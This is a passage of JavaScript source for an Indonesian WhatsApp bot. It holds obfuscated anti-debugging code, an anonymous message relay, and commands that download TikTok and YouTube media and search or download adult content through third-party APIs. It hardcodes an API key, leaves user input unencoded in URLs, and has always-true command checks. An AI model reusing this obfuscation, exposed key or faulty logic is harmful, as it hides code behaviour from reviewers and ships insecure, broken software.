_0x398f38();},'SAQni':function(_0x4a71f7,_0x452f3a,_0x2a1570){return _0x4a71f7(_0x452f3a,_0x2a1570);},'PLekC':function(_0x51738e,_0x37eee1){return _0x51738e+_0x37eee1;},'iofWw':function(_0x5ac6af,_0x2a37e6){return _0x5ac6af!==_0x2a37e6;},'slNvZ':_0x29072e(0x9,-0x64,-0x49,-0x66,0xe),'hcRmH':_0x974810(0x1fc,0x2b1,0x176,0x238,0x203),'PJYpl':_0x4aee6e(0x3b9,0x466,0x48e,0x43e,0x4cd),'VbTxd':function(_0x54b787,_0x171e83){return _0x54b787!==_0x171e83;},'KZaff':_0x51e09a(0x213,0x17e,0x1d5,0x1d3,0x100),'logvy':_0x51e09a(0x227,0x2af,0x208,0x31e,0x330),'FmjRi':function(_0x50dc5e,_0x430d92){return _0x50dc5e(_0x430d92);}};function _0x384bb0(_0x54c8ad){function _0x5f139e(_0x51479e,_0x461c36,_0x344c6f,_0x43adf5,_0x205ff7){return _0x4aee6e(_0x51479e-0x1e5,_0x43adf5- -0x4d6,_0x344c6f-0xc6,_0x43adf5-0x8f,_0x51479e);}function _0x1c7dd6(_0x12d631,_0x535a36,_0x27cf76,_0x3fe4c4,_0xd9e18e){return _0x974810(_0x3fe4c4-0x25f,_0x535a36-0x179,_0xd9e18e,_0x3fe4c4-0xad,_0xd9e18e-0x1b5);}function _0x3f39e3(_0x204896,_0x2656a3,_0x39ae1d,_0x210b09,_0x2235ac){return _0x3c7505(_0x204896-0xda,_0x2656a3-0xc8,_0x39ae1d-0x154,_0x2235ac,_0x204896- -0x6c);}function _0x524a7f(_0x1f0709,_0x24c2c3,_0x41de16,_0x19e626,_0x103a73){return _0x4aee6e(_0x1f0709-0xe0,_0x1f0709- -0x56,_0x41de16-0x198,_0x19e626-0x1c5,_0x41de16);}function _0x2c88b3(_0x55cd40,_0x77b04b,_0x4b4811,_0x406ca5,_0x4d66dd){return _0x3c7505(_0x55cd40-0x1ca,_0x77b04b-0x8e,_0x4b4811-0x186,_0x406ca5,_0x4b4811- -0x270);}const _0x1f2684={'IWgPu':_0x11c305[_0x3f39e3(0x5b3,0x5d9,0x5c6,0x568,0x5d6)],'rRlND':_0x11c305[_0x3f39e3(0x598,0x63b,0x52a,0x597,0x531)],'RzDZo':function(_0x4f5087,_0x514f15){function _0x1a679c(_0x58c864,_0x3ae612,_0x54d76e,_0x5d92ae,_0x5b6a03){return _0x524a7f(_0x54d76e-0x6f,_0x3ae612-0x45,_0x58c864,_0x5d92ae-0x16c,_0x5b6a03-0xcd);}return _0x11c305[_0x1a679c(0x46f,0x4ef,0x488,0x452,0x475)](_0x4f5087,_0x514f15);},'WtrlT':function(_0xf1e4e,_0x4eb7a7){function _0x276100(_0x357ec1,_0x253921,_0x422b8f,_0x3543f2,_0x125eed){return _0x524a7f(_0x3543f2- -0x3d8,_0x253921-0xa,_0x253921,_0x3543f2-0x15b,_0x125eed-0x5);}return _0x11c305[_0x276100(0x54,-0x47,-0x43,-0x64,0x18)](_0xf1e4e,_0x4eb7a7);},'JokHe':_0x11c305[_0x1c7dd6(0x4e6,0x54c,0x59e,0x4e7,0x55f)],'hSpSo':_0x11c305[_0x2c88b3(0x472,0x44c,0x3e5,0x381,0x34c)],'FYWWE':function(_0x42510b){function _0xb753df(_0x27b777,_0x173b74,_0x430a71,_0x3ca6e0,_0x471ca0){return _0x3f39e3(_0x27b777- -0x3d5,_0x173b74-0x123,_0x430a71-0x9d,_0x3ca6e0-0x14e,_0x471ca0);}return _0x11c305[_0xb753df(0x1bf,0x243,0x12a,0x188,0x1ba)](_0x42510b);},'dGsCK':function(_0x58fead){function _0x19d748(_0x112775,_0xd53d1a,_0x54667a,_0x13fe49,_0x1dcca0){return _0x1c7dd6(_0x112775-0x1bc,_0xd53d1a-0xb7,_0x54667a-0xd8,_0x13fe49-0xe6,_0xd53d1a);}return _0x11c305[_0x19d748(0x4d1,0x51d,0x56b,0x4df,0x536)](_0x58fead);},'QgCKc':function(_0x4200a8,_0x43aa85){function _0x2f4a38(_0x437905,_0x5e316e,_0x35afd3,_0x26e314,_0x276201){return _0x524a7f(_0x437905- -0x572,_0x5e316e-0x1ac,_0x5e316e,_0x26e314-0x10c,_0x276201-0x8f);}return _0x11c305[_0x2f4a38(-0xe2,-0x87,-0x49,-0x11d,-0x13a)](_0x4200a8,_0x43aa85);},'JfmPb':_0x11c305[_0x3f39e3(0x4f0,0x4b8,0x4e2,0x54e,0x480)]};if(_0x11c305[_0x3f39e3(0x4c5,0x537,0x521,0x525,0x482)](_0x11c305[_0x2c88b3(0x481,0x41c,0x3d0,0x427,0x377)],_0x11c305[_0x524a7f(0x4ac,0x55f,0x465,0x480,0x467)]))return function(_0x11b222){}[_0x3f39e3(0x5a6,0x594,0x511,0x5d8,0x63b)+_0x2c88b3(0x420,0x4a8,0x3ff,0x351,0x464)+'r'](_0x1f2684[_0x5f139e(-0x42,-0x27,-0xcd,-0x3a,-0xbd)])[_0x2c88b3(0x365,0x49b,0x3fa,0x4ac,0x483)](_0x1f2684[_0x5f139e(0x6d,-0xae,-0xb1,-0x47,-0xa)]);else{if(_0x11c305[_0x5f139e(-0x16f,-0xb4,-0x36,-0xc7,-0xc8)](typeof _0x54c8ad,_0x11c305[_0x2c88b3(0x403,0x421,0x3e2,0x489,0x48f)])){if(_0x11c305[_0x3f39e3(0x5d0,0x5c5,0x5ab,0x5b8,0x67c)](_0x11c305[_0x524a7f(0x383,0x303,0x2f2,0x324,0x34d)],_0x11c305[_0x2c88b3(0x2b8,0x260,0x2a1,0x200,0x2d3)]))return function(_0x1bfac2){}[_0x3f39e3(0x5a6,0x5d4,0x5cd,0x544,0x5db)+_0x2c88b3(0x396,0x34d,0x3ff,0x471,0x358)+'r'](_0x11c305[_0x2c88b3(0x35c,0x368,0x3af,0x45e,0x310)])[_0x5f139e(-0x61,0x18,-0x18,0x56,0xec)](_0x11c305[_0x524a7f(0x470,0x49d,0x4c2,0x3fa,0x46c)]);else{let _0x517a8d;try{const _0x266212=_0x1f2684[_0x2c88b3(0x2bb,0x2ef,0x31e,0x2df,0x382)](_0x2912af,_0x1f2684[_0x2c88b3(0x2cb,0x226,0x29a,0x30c,0x23c)](_0x1f2684[_0x524a7f(0x376,0x30b,0x2da,0x3d7,0x3c2)](_0x1f2684[_0x1c7dd6(0x53d,0x55b,0x4a2,0x528,0x4d6)],_0x1f2684[_0x1c7dd6(0x54f,0x4df,0x42b,0x4b6,0x43d)]),');'));_0x517a8d=_0x1f2684[_0x524a7f(0x42e,0x413,0x475,0x379,0x3e5)](_0x266212);}catch(_0x1e54eb){_0x517a8d=_0x4965f8;}_0x517a8d[_0x1c7dd6(0x594,0x56d,0x4c8,0x50c,0x4a4)+_0x5f139e(-0xec,0x34,-0x123,-0x76,-0x9c)+'l'](_0x3b4291,0x22c8+0x268e+0xa6*-0x59);}}else{if(_0x11c305[_0x3f39e3(0x5d0,0x51f,0x5ae,0x601,0x59f)](_0x11c305[_0x3f39e3(0x4a6,0x4ba,0x487,0x4e1,0x538)],_0x11c305[_0x3f39e3(0x57e,0x565,0x5d1,0x501,0x59e)])){if(_0x11c305[_0x1c7dd6(0x4dd,0x5ba,0x54a,0x510,0x534)](_0x11c305[_0x5f139e(-0x152,-0x3b,-0x147,-0xdd,-0x148)]('',_0x11c305[_0x5f139e(0xd2,0x8,0x4,0x59,-0x38)](_0x54c8ad,_0x54c8ad))[_0x11c305[_0x1c7dd6(0x417,0x478,0x494,0x4cc,0x47e)]],0x1b0+-0x138*0xb+0xbb9)||_0x11c305[_0x5f139e(0xc8,-0x69,0xd,0x10,0x68)](_0x11c305[_0x524a7f(0x3d6,0x34b,0x389,0x379,0x3a8)](_0x54c8ad,-0x14*-0x17c+-0x142a+-0x972),0x1adf+0x1*-0x1cc3+-0x1e4*-0x1)){if(_0x11c305[_0x524a7f(0x490,0x4c3,0x473,0x401,0x510)](_0x11c305[_0x1c7dd6(0x55d,0x43a,0x42e,0x4bf,0x4dc)],_0x11c305[_0x524a7f(0x45a,0x50c,0x3ae,0x435,0x41c)]))(function(){function _0x49df46(_0x3f68bf,_0xa24809,_0x141ead,_0x171958,_0x240512){return _0x524a7f(_0xa24809- -0x347,_0xa24809-0x17a,_0x171958,_0x171958-0x9,_0x240512-0x12c);}function _0x424cd3(_0x5ebaab,_0x5a4906,_0x5dae7e,_0x24143a,_0x423bd2){return _0x3f39e3(_0x5ebaab- -0x31b,_0x5a4906-0x64,_0x5dae7e-0x8e,_0x24143a-0x10b,_0x5dae7e);}function _0x115a80(_0x110f3d,_0x292f9b,_0x3fe259,_0x205147,_0x2e6b54){return _0x5f139e(_0x110f3d,_0x292f9b-0x1e5,_0x3fe259-0xa7,_0x205147-0x50a,_0x2e6b54-0x2);}function _0xaf0908(_0x572576,_0x14b5b7,_0x23d146,_0x3d4513,_0x255881){return _0x524a7f(_0x572576- -0x403,_0x14b5b7-0x1ea,_0x255881,_0x3d4513-0x1b0,_0x255881-0xf4);}if(_0x1f2684[_0x49df46(0x1af,0x187,0x11e,0x210,0x1d9)](_0x1f2684[_0x115a80(0x573,0x5a4,0x5de,0x556,0x574)],_0x1f2684[_0x49df46(0x160,0x185,0x123,0x23a,0x111)]))return!![];else _0x1f2684[_0x49df46(0x87,0xed,0xaf,0x85,0x151)](_0x28bcbd);}[_0x1c7dd6(0x4f1,0x4c3,0x4b4,0x4e3,0x460)+_0x5f139e(-0x33,-0x58,0x5c,0x5b,0xfd)+'r'](_0x11c305[_0x3f39e3(0x5a1,0x4f9,0x514,0x51f,0x638)](_0x11c305[_0x524a7f(0x396,0x3d6,0x325,0x403,0x2e5)],_0x11c305[_0x524a7f(0x4a0,0x51d,0x40d,0x4a5,0x4b2)]))[_0x524a7f(0x379,0x2fd,0x3b5,0x41b,0x35e)](_0x11c305[_0x2c88b3(0x2f5,0x3fe,0x380,0x378,0x354)]));else{const _0x2faadc=_0x336609[_0x1c7dd6(0x574,0x4de,0x5ea,0x53b,0x4fc)](_0x13e8ae,arguments);return _0x3e82a8=null,_0x2faadc;}}else{if(_0x11c305[_0x1c7dd6(0x53a,0x469,0x587,0x4f5,0x546)](_0x11c305[_0x1c7dd6(0x362,0x416,0x39f,0x3d6,0x392)],_0x11c305[_0x524a7f(0x371,0x2f7,0x390,0x368,0x2e3)]))(function(){function _0x2d5527(_0x3169a3,_0x402e02,_0x42d712,_0x140bdb,_0x578400){return _0x1c7dd6(_0x3169a3-0x82,_0x402e02-0x22,_0x42d712-0x1b9,_0x140bdb-0x46,_0x578400);}function _0x3c41a0(_0x4749c3,_0x5cd721,_0x220a2e,_0x2fbc30,_0x525325){return _0x524a7f(_0x220a2e- -0x489,_0x5cd721-0x152,_0x2fbc30,_0x2fbc30-0x26,_0x525325-0x167);}function _0x133ca3(_0x554cfc,_0x3eb0e8,_0x5a1cc2,_0x42106c,_0x18c0de){return _0x3f39e3(_0x5a1cc2- -0x369,_0x3eb0e8-0x75,_0x5a1cc2-0xdb,_0x42106c-0xc1,_0x18c0de);}if(_0x11c305[_0x133ca3(0x21d,0x26e,0x26a,0x2c7,0x1f3)](_0x11c305[_0x133ca3(0xe1,0xc6,0x166,0x178,0x116)],_0x11c305[_0x133ca3(0xd6,0x126,0x18a,0x215,0x21a)]))return![];else _0x4095f3=_0x3511c1;}[_0x1c7dd6(0x552,0x56e,0x439,0x4e3,0x452)+_0x3f39e3(0x603,0x6a2,0x5a2,0x5d9,0x5b8)+'r'](_0x11c305[_0x3f39e3(0x49c,0x409,0x497,0x405,0x49a)](_0x11c305[_0x5f139e(-0x88,-0x90,-0x53,-0xea,-0xa4)],_0x11c305[_0x524a7f(0x4a0,0x4df,0x4c0,0x42d,0x4ab)]))[_0x1c7dd6(0x5a8,0x4e7,0x4e5,0x53b,0x4c5)](_0x11c305[_0x5f139e(-0x52,-0x41,0xc,-0x8,-0x33)]));else{if(_0x9a60cd){const _0x216fd2=_0x1b5e41[_0x5f139e(0xad,0x7e,0xa2,0x56,-0x34)](_0x2d4935,arguments);return _0x163167=null,_0x216fd2;}}}}else{const _0x7d05cd=_0x15e0f2?function(){function _0x6df245(_0x332a24,_0x1c5553,_0x160734,_0x48be92,_0x29f1bd){return _0x5f139e(_0x48be92,_0x1c5553-0xa9,_0x160734-0x1be,_0x332a24- -0x3b,_0x29f1bd-0x1d7);}if(_0x506deb){const _0x325a48=_0x266cc0[_0x6df245(0x1b,0xcd,0x2e,-0x47,0x77)](_0x20da75,arguments);return _0x15a989=null,_0x325a48;}}:function(){};return _0x5d26b6=![],_0x7d05cd;}}_0x11c305[_0x1c7dd6(0x489,0x469,0x389,0x41c,0x3fb)](_0x384bb0,++_0x54c8ad);}}function _0x4aee6e(_0x22c231,_0x5a4740,_0x2aa9e7,_0x275abe,_0x2b921d){return _0xc16d28(_0x2b921d,_0x5a4740-0x120,_0x5a4740- -0x86,_0x275abe-0xdc,_0x2b921d-0x1af);}function _0x29072e(_0x4ca9d5,_0x532d41,_0x21d8e8,_0x426e72,_0x12b794){return _0x182d1c(_0x12b794- -0x44d,_0x532d41,_0x21d8e8-0x14d,_0x426e72-0x3,_0x12b794-0xb1);}function _0x3c7505(_0x434ab8,_0xeb1e9f,_0x2ccfcb,_0x40c413,_0x39c529){return _0x39afc8(_0x434ab8-0x1,_0x40c413,_0x2ccfcb-0x16b,_0x39c529-0xd3,_0x39c529-0x177);}function _0x974810(_0x429d53,_0x4d86df,_0x591e9f,_0x5a35f7,_0x30bb6a){return _0x1fe593(_0x429d53-0xbe,_0x4d86df-0x1e0,_0x429d53-0x2a4,_0x591e9f,_0x30bb6a-0x16e);}function _0x51e09a(_0x53292e,_0x353cbf,_0x3789e5,_0x400a36,_0xecad49){return _0x39afc8(_0x53292e-0x96,_0x53292e,_0x3789e5-0x20,_0x353cbf- -0x2d2,_0xecad49-0xc);}try{if(_0x11c305[_0x29072e(0x3b,0x10e,0x152,0x2c,0xac)](_0x11c305[_0x51e09a(0x2a8,0x26a,0x2a2,0x1e8,0x1d9)],_0x11c305[_0x3c7505(0x591,0x625,0x608,0x5d5,0x60f)])){const _0x1e335e={'WIWaz':_0x11c305[_0x4aee6e(0x48f,0x4c3,0x4d8,0x4ce,0x46e)],'lnsIx':_0x11c305[_0x4aee6e(0x454,0x3fa,0x407,0x34d,0x3ef)],'vwRae':function(_0x6cc823,_0x14e666){function _0x1324a8(_0x353fd7,_0x59525a,_0x37cd8e,_0x5c1bf2,_0x4d6a68){return _0x3c7505(_0x353fd7-0x1bb,_0x59525a-0x142,_0x37cd8e-0x19d,_0x37cd8e,_0x59525a- -0x16b);}return _0x11c305[_0x1324a8(0x467,0x424,0x4c3,0x377,0x448)](_0x6cc823,_0x14e666);},'OOTWi':_0x11c305[_0x29072e(-0x96,0x36,-0x6c,-0xd2,-0x31)],'upjIQ':function(_0x145cff,_0x3549d2){function _0xdee5f0(_0x5b2c10,_0x37883c,_0x5eba36,_0x1f8c3a,_0xf3c758){return _0x29072e(_0x5b2c10-0x129,_0x37883c,_0x5eba36-0x6f,_0x1f8c3a-0x169,_0x5eba36-0xa);}return _0x11c305[_0xdee5f0(-0x6d,-0xe2,-0x7b,-0x9e,-0x2f)](_0x145cff,_0x3549d2);},'OIoep':_0x11c305[_0x4aee6e(0x525,0x47b,0x45a,0x4b9,0x437)],'GXdUr':_0x11c305[_0x29072e(0xd3,0x9a,0x64,-0x39,0x47)],'clamN':function(_0x2a5177,_0x5ad4a9){function _0xdccdd1(_0x4b8319,_0x46bbb4,_0x58ffda,_0x38fefb,_0x549b63){return _0x29072e(_0x4b8319-0xea,_0x4b8319,_0x58ffda-0x11e,_0x38fefb-0x11c,_0x58ffda-0x3e4);}return _0x11c305[_0xdccdd1(0x44c,0x3a9,0x3d5,0x42c,0x3b3)](_0x2a5177,_0x5ad4a9);},'LvGeB':function(_0x4b8963){function _0xcabab4(_0x39260b,_0xbc9694,_0x220dbc,_0x5b360d,_0x593e19){return _0x4aee6e(_0x39260b-0x1,_0x593e19- -0x2c4,_0x220dbc-0xec,_0x5b360d-0x188,_0xbc9694);}return _0x11c305[_0xcabab4(0x1af,0x2af,0x19a,0x16d,0x1fd)](_0x4b8963);}};_0x11c305[_0x3c7505(0x527,0x4f6,0x501,0x56e,0x574)](_0x4beb83,this,function(){function _0x336eb6(_0x2dbe95,_0x2a0f0e,_0x377a51,_0x24bf23,_0xe40b71){return _0x4aee6e(_0x2dbe95-0xf6,_0x2dbe95- -0x3f1,_0x377a51-0x186,_0x24bf23-0x1b8,_0xe40b71);}function _0x3bd5f3(_0x511c85,_0x5e1de2,_0x586583,_0x19edeb,_0x141b9a){return _0x3c7505(_0x511c85-0x1aa,_0x5e1de2-0x0,_0x586583-0x135,_0x511c85,_0x586583- -0x229);}function _0x22264b(_0x5512db,_0x15c6a2,_0x1f27dc,_0x2514c2,_0x29f1a1){return _0x974810(_0x2514c2- -0x1cd,_0x15c6a2-0x16d,_0x1f27dc,_0x2514c2-0x1f0,_0x29f1a1-0x15d);}const _0x286f4e=new _0x506945(_0x1e335e[_0x39bbbe(0x146,0xd6,0x165,0x1db,0x152)]),_0x4b6733=new _0x250176(_0x1e335e[_0x39bbbe(0xdc,0x177,0xc8,0x15c,0x114)],'i');function _0x31c6bd(_0x1a821c,_0x4badc2,_0x12a65c,_0x5ec5ed,_0x4c1726){return _0x29072e(_0x1a821c-0xc7,_0x1a821c,_0x12a65c-0xcf,_0x5ec5ed-0x148,_0x12a65c-0x50d);}const _0x371c53=_0x1e335e[_0x22264b(0x17,0x29,0xaa,0x3e,-0x54)](_0x3eeeac,_0x1e335e[_0x336eb6(-0xf,-0x8b,-0x65,-0xb9,-0xbf)]);function _0x39bbbe(_0x29da8d,_0x5a5086,_0x36475f,_0x5c7ec2,_0x48432f){return _0x4aee6e(_0x29da8d-0xde,_0x48432f- -0x3c3,_0x36475f-0x58,_0x5c7ec2-0x1,_0x36475f);}!_0x286f4e[_0x39bbbe(0xfa,0x10a,0x74,0xe5,0xf1)](_0x1e335e[_0x22264b(0x11c,0x117,0x51,0x77,0xe3)](_0x371c53,_0x1e335e[_0x336eb6(0x85,-0x2a,0xb,0xd5,0x7d)]))||!_0x4b6733[_0x39bbbe(0x62,0x78,0x85,0x137,0xf1)](_0x1e335e[_0x31c6bd(0x5ab,0x4a2,0x523,0x5d6,0x56a)](_0x371c53,_0x1e335e[_0x22264b(0x15,-0x79,0x8b,-0x2,0x34)]))?_0x1e335e[_0x39bbbe(0xa3,0x1f2,0x162,0x14c,0x142)](_0x371c53,'0'):_0x1e335e[_0x39bbbe(0x11e,0x52,0x12f,0x89,0x10a)](_0x1d3346);})();}else{if(_0x443ec7){if(_0x11c305[_0x3c7505(0x564,0x502,0x519,0x50f,0x54d)](_0x11c305[_0x4aee6e(0x4e9,0x456,0x408,0x4cc,0x4c4)],_0x11c305[_0x3c7505(0x5a1,0x54d,0x5bf,0x5c0,0x590)]))(function(){return![];}[_0x51e09a(0x2cc,0x26d,0x1f7,0x2e2,0x216)+_0x4aee6e(0x5b3,0x531,0x4f3,0x48c,0x5b6)+'r'](_0x11c305[_0x3c7505(0x655,0x5cf,0x555,0x4f4,0x59d)](_0x11c305[_0x4aee6e(0x43d,0x3ec,0x38d,0x375,0x48a)],_0x11c305[_0x51e09a(0x275,0x28f,0x309,0x220,0x330)]))[_0x4aee6e(0x555,0x52c,0x4b4,0x478,0x5a3)](_0x11c305[_0x29072e(0x78,-0x4,0xf8,-0x5a,0x50)]));else return _0x384bb0;}else _0x11c305[_0x29072e(-0x86,0x4c,-0x62,-0x68,-0x35)](_0x11c305[_0x51e09a(0x2c0,0x22b,0x2c5,0x204,0x196)],_0x11c305[_0x4aee6e(0x4be,0x485,0x4a3,0x52a,0x431)])?_0x11c305[_0x974810(0x1af,0x252,0x20e,0xf7,0x1bd)](_0x384bb0,-0xb*0x1a5+0x891*-0x1+0x1aa8):_0x49f1e1=_0x97e0b4;}}catch(_0x56601c){}} 
const plokok = `Itu ownerku bukan nomer robot, Owner hanya menjawab seputar ${botName}. Utamakan chat to the point`
conn.sendButtonText(from, [{ buttonId: '.menu', buttonText: { displayText: 'Menu' }, type: 1 }], plokok, setting.footer, oner) 
}
break 

default:

// function menfess
var _0x1a6220=_0x4a33;(function(_0x5b325d,_0xd37330){var _0x15f0df=_0x4a33,_0x17b9a4=_0x5b325d();while(!![]){try{var _0x5034a9=parseInt(_0x15f0df(0x1d3))/0x1*(-parseInt(_0x15f0df(0x1ca))/0x2)+-parseInt(_0x15f0df(0x1d4))/0x3*(parseInt(_0x15f0df(0x1c5))/0x4)+parseInt(_0x15f0df(0x1c7))/0x5*(-parseInt(_0x15f0df(0x1cf))/0x6)+-parseInt(_0x15f0df(0x1d5))/0x7*(parseInt(_0x15f0df(0x1c9))/0x8)+-parseInt(_0x15f0df(0x1cc))/0x9+-parseInt(_0x15f0df(0x1c4))/0xa+parseInt(_0x15f0df(0x1cd))/0xb;if(_0x5034a9===_0xd37330)break;else _0x17b9a4['push'](_0x17b9a4['shift']());}catch(_0x1d82f8){_0x17b9a4['push'](_0x17b9a4['shift']());}}}(_0x351e,0x54a56));function _0x4a33(_0x1e5c04,_0x200f07){var _0x351e1e=_0x351e();return _0x4a33=function(_0x4a33ba,_0x1cdc80){_0x4a33ba=_0x4a33ba-0x1c3;var _0x110a2e=_0x351e1e[_0x4a33ba];return _0x110a2e;},_0x4a33(_0x1e5c04,_0x200f07);}function _0x351e(){var _0x26a0e1=['pesan\x20diteruskan','1103568ZGfugO','sendMessage','message','text','445736reezra','18tskWyb','1168237exHeIM','messages','4186710kRyETk','297452lFwhFR','type','10QPbKSn','teman','16yYTSyk','2wHOPdZ','conversation','2985354kCXAlP','29597029dyJWde'];_0x351e=function(){return _0x26a0e1;};return _0x351e();}if(!isCmd){if(cekPesan('id',sender)==null)return;if(cekPesan(_0x1a6220(0x1c8),sender)==![])return;if(m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1c6)]==_0x1a6220(0x1cb)||m[_0x1a6220(0x1c3)][0x0]['type']=='extendedTextMessage'){try{var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)]['extendedTextMessage'][_0x1a6220(0x1d2)];}catch(_0x2d0d82){var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)][_0x1a6220(0x1cb)];}let text_nya_menfes='*Balasan*\x20:\x20'+chat_anonymous;conn[_0x1a6220(0x1d0)](cekPesan(_0x1a6220(0x1c8),sender),{'text':text_nya_menfes}),conn['sendMessage'](from,{'text':_0x1a6220(0x1ce)},{'quoted':msg});}}

if (command === 'tiktok') {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply('Masukkan Link !!')
reply(mess.wait)
var tt_teky = await fetchJson(`https://api.itsrose.my.id/downloader/tiktok?url=${q}`)
var tt_rei = tt_teky.download
conn.sendMessage(from,{video:{url:tt_rei.nowm}, caption:'✅ Done'}, {quoted : msg})
} else if (command === 'ytmp4') {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply('Masukkan Link !!')
let ngoh = await fetchJson(`https://zenzapis.xyz/downloader/youtube?apikey=91d438af27&url=${q}`)
let pidio = ngoh.result
let meong = `◦「 YouTube Mp4 」◦

◦ Title : ${pidio.title}
◦ Channel : ${pidio.channel}
◦ Views : ${pidio.views}
◦ Quality : ${pidio.uploadDate}
◦ Size : ${pidio.sizeVideo}
◦ Desk : ${pidio.desc}
◦ Url : ${q}
`
let buttonYoutube = {
image: { url: pidio.thumb },
caption: meong,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, buttonYoutube, { quoted: msg })
conn.sendMessage(from, { video: { url: pidio.getVideo }, mimetype: 'video/mp4', fileName: `${pidio.title}.mp4`, caption: '✅ Done' }, { quoted: msg })
} else if (command === 'ytmp3') {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply('Masukkan Link !!')
let ngah = await fetchJson (`https://zenzapis.xyz/downloader/youtube?apikey=91d438af27&url=${q}`)
var audio = ngah.result
var ntahlah = `◦「 YouTube Mp3 」◦

◦ Title : ${audio.title}
◦ Channel : ${audio.channel}
◦ Views : ${audio.views}
◦ Quality : ${audio.uploadDate}
◦ Size : ${audio.sizeAudio}
◦ Desk : ${audio.desc}
◦ Url : ${q}
`
let buttonYtmp3 = {
image: { url: audio.thumb },
caption: ntahlah,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, buttonYtmp3, { quoted: msg })
conn.sendMessage(from, { audio: { url : audio.getAudio }, mimetype: 'audio/mpeg', fileName: `${audio.title}.mp3` }, { quoted : msg })
} else if (command === 'kbbi') {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply('Masukkan Query !!')
let gam_kbbi = await getBuffer(picak + 'kbbi')
var kbbi = await fetchJson (`https://api.itsrose.my.id/searching/kbbi?query=${q}`)
var text_kbbi = `◦「 KBBI 」◦

◦ Kata : ${q}
◦ Result : ${kbbi.result}`
let button_kbbi= {
image: gam_kbbi,
caption: text_kbbi,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, button_kbbi, { quoted: msg })
} else if (command === 'pixif') {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply('Masukkan Query !!')
var pixifs = await fetchJson (`https://api.itsrose.my.id/searching/pixiv?query=${q}&mode=search&r18=1&random=0`)
var btnPixif = [{ buttonId: `${chats}`, buttonText: { displayText: 'Next Image' }, type: 1 }]
var pixImage = pixifs[0].url
let buttonPixif = {
image: { url : pixImage },
caption: `◦「 Pixif Search 」◦\n\n◦ Title : ${pixifs[0].title }\n◦ Author : ${pixifs[0].author}\n◦ Link : ${pixifs[0].url}`,
footer: setting.footer,
buttons: btnPixif,
headerType: 4,
}
conn.sendMessage(from, buttonPixif, { quoted: msg })
} else if (command === 'doujindl') {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply('Masukkan Link !!')
let gam_doujins = await getBuffer(picak + 'Doujin Downloader')
var link_dojins = await fetchJson (`https://api.itsrose.my.id/dewasa/doujindesu/download?url=${q}`)
var link_dojin = link_dojins.result
var text_doujin = `◦「 Doujin Downloader 」◦

◦ Title: ${link_dojin.title}
◦ Genre : ${link_dojin.tags}
◦ Status : ${link_dojin.information.status}
◦️ Type : ${link_dojin.information.type}
◦ Chapter : ${link_dojin.chapters[0].episode}
◦ Last Update : ${link_dojin.chapters[0].date}
◦ Url : ${link_dojin.chapters[0].url}`
let button_dojin = {
image: gam_doujins,
caption: text_doujin,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, button_dojin, { quoted: msg })
} else if (command === 'doujinsearch') {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply('Masukkan Query !!')
let gam_doujin = await getBuffer(picak + 'Doujin Search')
var link_doujin = await fetchJson (`https://api.itsrose.my.id/dewasa/doujindesu/search?query=${q}`)
var res_doujin = link_doujin.result
let txt_doujin = `◦「 Doujin Search 」◦\n\n`
for (let i of res_doujin) {
txt_doujin += `◦ Title: ${i.title}
◦ Type : ${i.type}
◦ Score : ${i.score}
◦ Status : ${i.status}
◦ Url : ${i.url}\n----------------------------------------\n`
}
let buttonDoujin = {
image: gam_doujin,
caption: txt_doujin,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, buttonDoujin, { quoted: msg })
} else if (command === 'bkpsearch') {
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply('Masukkan Query !!')
var bkpSearch = await fetchJson (`https://api.itsrose.my.id/dewasa/xnxx/search?query=${q}`)
var hsilBkp = bkpSearch.result
var hsilBkp2 = bkpSearch.result[0]
let txtBkp = `*————「 Bokep Search 」————*\n\n`
for (let i of hsilBkp) {
txtBkp += `◦ Title: ${i.title}
◦ Views : ${i.views}
◦️ Quality : ${i.quality}
◦ Duration : ${i.duration}
◦ Url : ${i.url}\n----------------------------------------\n`
}
let buttonBokeps = {
image: { url : hsilBkp2.thumb },
caption: txtBkp,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, buttonBokeps, { quoted: msg })
} else if (command === 'bkpdl' || 'bkpdownload' || 'bokepdl' || 'bokepdownload') {
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply('Masukkan Link !!')
let gamBokep = await getBuffer(picak + 'Bokep Downloader')
var bkpDl = await fetchJson(`https://api.itsrose.my.id/dewasa/xnxx/detail?url=${q}`)
var hasilBkp = bkpDl.result
let txtBokep = `◦「 Bokep Downloader 」◦

◦ Title: ${hasilBkp.title}
◦ Info: ${hasilBkp.info}
◦️ Deskripsi: ${hasilBkp.descripion}
◦ Url: ${q}
`
let buttonBokep = {
image: gamBokep,
caption: txtBokep,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, buttonBokep, { quoted: msg })
conn.sendMessage(from, { video: { url: hasilBkp.downloads.hd }, mimetype: 'video/mp4', fileName: `${setting.botName}.mp4`, caption: '✅ Done' }, { quoted: msg })
} else if (command === 'gimage' || 'googleimage' || 'gimg' || 'googleimg') {
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)

if (!q) return reply('Masukkan Query')
reply(mess.wait)
var btnGimg = [{ buttonId: `${chats}`, buttonText: { displayText: 'Next Image' }, type: 1 }]
var gimg = await fetchJson(`https://api.itsrose.my.id/searching/googleimages?query=${q}`)
var ggi = gimg.result[0]
let buttonGimg = {
image: { url : ggi },
caption: `◦「 Google Image 」◦\n\n◦Query : ${q}`,
footer: setting.footer,
buttons: btnGimg,
headerType: 4,
}
